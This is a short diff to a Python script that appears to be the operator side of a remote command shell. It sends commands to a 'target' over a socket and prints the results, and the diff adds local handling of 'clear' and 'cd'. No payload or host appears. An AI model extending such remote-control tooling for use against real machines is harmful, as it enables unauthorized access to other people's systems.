@@ -1,5 +1,6 @@
 import socket
 import json
+import os
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -21,6 +22,10 @@ def target_comm():
         reliable_send(command)
         if command == 'quit':
             break
+        elif command[:3] == 'cd ':
+            pass
+        elif command == 'clear':
+            os.system('clear')
         else:
             result = reliable_recieve()
             print(result)
